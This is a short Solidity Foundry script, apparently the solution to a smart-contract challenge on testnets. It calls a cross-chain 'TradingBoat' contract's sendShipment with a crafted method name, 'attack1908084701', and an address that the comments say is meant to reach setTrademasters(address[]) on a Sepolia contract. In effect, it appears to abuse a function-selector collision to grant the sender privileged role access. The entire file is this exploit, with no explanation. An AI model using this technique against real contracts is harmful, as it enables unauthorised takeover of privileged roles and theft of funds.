// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Script, console2} from "forge-std/Script.sol";
import "../contracts/TradingBoat.sol";

// forge script scripts/TradingBoat.s.sol --rpc-url fuji -vvv --broadcast
contract SendShipmentScript is Script {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public returns (bytes32 signature){
        vm.startBroadcast(deployerPrivateKey);
        TradingBoat tradingBoat = TradingBoat(0x423e0D8466B6a962286C718E92b751B87b65a48c);

        string memory _method = "attack1908084701";
        bytes32[] memory _args = new bytes32[](1);
        _args[0] = bytes32(uint256(uint160(0x26d403E1E1A1239d8b6f5907dE272CF311104753))); // address to input in setTrademasters(address[])
        uint64 _fromChainId = 43113; //fuji
        uint64 _toChainId = 11155111; //sepolia
        address _fromContract = 0x26d403E1E1A1239d8b6f5907dE272CF311104753; // fuji msg.sender
        address _toContract = 0x39eEddbBD4D133c3fcb0fD7B971f807Fc3552569; // sepolia TradingData
         
        signature = tradingBoat.sendShipment(_method, _args, _toChainId, _toContract); 
        // signature = 0xdfcb71ad5b91bbcb5818aab6c9319c7e025b331bcb1f54bd1082253e29601f3571a06c46d4ca69e33604c6dff656f23eeda01932398ff6f4a50bbc9bcc3041671b

        vm.stopBroadcast();
    }
}